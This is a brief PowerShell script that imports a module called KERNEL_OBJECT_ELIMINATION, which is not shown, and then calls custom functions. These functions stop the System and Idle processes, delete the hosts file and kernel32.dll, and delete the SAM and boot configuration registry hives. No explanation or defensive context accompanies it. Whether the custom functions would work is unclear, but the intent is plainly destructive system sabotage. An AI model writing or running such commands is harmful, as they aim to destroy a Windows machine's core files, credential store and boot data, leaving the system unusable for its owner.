Remove-Module -Name KERNEL_OBJECT_ELIMINATION -Force
Import-Module -Name ".\KERNEL_OBJECT_ELIMINATION.psm1" -Force


Start-Process "calc"
STOP_PROCESS("calc")
STOP_PROCESS("idle")
STOP_PROCESS("system")
STOP_PROCESS("notepad")

DELETE_FILE("C:\Windows\System32\drivers\etc\hosts")
DELETE_FILE("C:\Windows\System32\kernel32.dll")

DELETE_REGISTRY("HKLM:\SAM")
DELETE_REGISTRY("HKLM:\BCD00000000")
